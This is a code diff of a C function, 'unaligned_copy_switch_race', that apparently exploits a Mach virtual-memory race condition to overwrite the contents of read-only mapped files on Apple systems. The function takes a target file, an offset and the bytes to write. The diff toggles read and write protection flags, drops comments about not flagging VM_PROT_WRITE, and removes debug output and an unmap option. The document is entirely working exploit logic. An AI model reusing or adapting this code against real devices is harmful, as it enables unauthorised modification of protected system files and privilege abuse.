@@ -77,8 +77,8 @@ switcheroo_thread(__unused void *arg)
             ctx->mem_entry_ro,
             0,
             FALSE,         /* copy */
-            VM_PROT_READ,   //Don't flag VM_PROT_WRITE
-            VM_PROT_READ,   //Don't flag VM_PROT_WRITE
+            VM_PROT_READ,
+            VM_PROT_READ,
             VM_INHERIT_DEFAULT);
         T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() RO");
         /* tell main thread we're don switching mappings */
@@ -88,7 +88,7 @@ switcheroo_thread(__unused void *arg)
     return NULL;
 }
 
-bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const void* overwrite_data, size_t overwrite_length, bool unmapAtEnd) {
+bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const void* overwrite_data, size_t overwrite_length) {
     bool retval = false;
     pthread_t th = NULL;
     int ret;
@@ -108,13 +108,13 @@ bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const 
     ctx = &context1;
     ctx->obj_size = 256 * 1024;
 
-    void* file_mapped = mmap(NULL, ctx->obj_size, PROT_READ | PROT_WRITE, MAP_SHARED, file_to_overwrite, file_offset);
+    void* file_mapped = mmap(NULL, ctx->obj_size, PROT_READ, MAP_SHARED, file_to_overwrite, file_offset);
     if (file_mapped == MAP_FAILED) {
         fprintf(stderr, "failed to map\n");
         return false;
     }
     if (!memcmp(file_mapped, overwrite_data, overwrite_length)) {
-//        fprintf(stderr, "already the same?\n");
+        fprintf(stderr, "already the same?\n");
         munmap(file_mapped, ctx->obj_size);
         return true;
     }
@@ -144,7 +144,7 @@ bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const 
         ro_addr,
         ctx->obj_size,
         TRUE,             /* set_maximum */
-        VM_PROT_READ | VM_PROT_WRITE);
+        VM_PROT_READ);
     T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "vm_protect ro_addr");
     /* make sure we can't get read-write handle on that target memory */
     mo_size = ctx->obj_size;
@@ -160,7 +160,7 @@ bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const 
     kr = mach_make_memory_entry_64(mach_task_self(),
         &mo_size,
         ro_addr,
-        MAP_MEM_VM_SHARE | VM_PROT_READ,    //Don't flag VM_PROT_WRITE
+        MAP_MEM_VM_SHARE | VM_PROT_READ,
         &ctx->mem_entry_ro,
         MACH_PORT_NULL);
     T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "make_mem_entry() RO");
@@ -175,7 +175,7 @@ bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const 
         ctx->mem_entry_ro,
         0,
         FALSE,         /* copy */
-        VM_PROT_READ | VM_PROT_WRITE,
+        VM_PROT_READ,
         VM_PROT_READ | VM_PROT_WRITE,
         VM_INHERIT_DEFAULT);
     T_QUIET; T_EXPECT_MACH_ERROR(kr, KERN_INVALID_RIGHT, " vm_map() mem_entry_rw");
@@ -255,10 +255,10 @@ bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const 
     dispatch_semaphore_wait(ctx->running_sem, DISPATCH_TIME_FOREVER);
 
     duration = 10; /* 10 seconds */
+    T_LOG("Testing for %ld seconds...", duration);
     for (start = time(NULL), loops = 0;
         time(NULL) < start + duration;
         loops++) {
-        printf("loops: %d\n", loops);
         /* reserve space for our 2 contiguous allocations */
         e2 = 0;
         kr = vm_allocate(mach_task_self(),
@@ -286,8 +286,8 @@ bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const 
             ctx->mem_entry_ro,
             0,
             FALSE,         /* copy */
-            VM_PROT_READ | VM_PROT_WRITE,
-            VM_PROT_READ | VM_PROT_WRITE,
+            VM_PROT_READ,
+            VM_PROT_READ,
             VM_INHERIT_DEFAULT);
         T_QUIET; T_EXPECT_MACH_SUCCESS(kr, " vm_map() mem_entry_ro");
 
@@ -302,7 +302,6 @@ bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const 
             ctx->obj_size - 1 + overwrite_length,
             e2 + 1,
             &copied_size);
-        printf("kr? 0x%x\n", kr);
         T_QUIET;
         T_ASSERT_TRUE(kr == KERN_SUCCESS || kr == KERN_PROTECTION_FAILURE,
             "vm_read_overwrite kr %d", kr);
@@ -344,11 +343,6 @@ bool unaligned_copy_switch_race(int file_to_overwrite, off_t file_offset, const 
     ctx->done = true;
     pthread_mutex_unlock(&ctx->mtx);
     pthread_join(th, NULL);
-    
-    if (unmapAtEnd) {
-        munmap(file_mapped, ctx->obj_size);
-    }
-
 
     kr = mach_port_deallocate(mach_task_self(), ctx->mem_entry_rw);
     T_QUIET; T_ASSERT_MACH_SUCCESS(kr, "mach_port_deallocate(me_rw)");
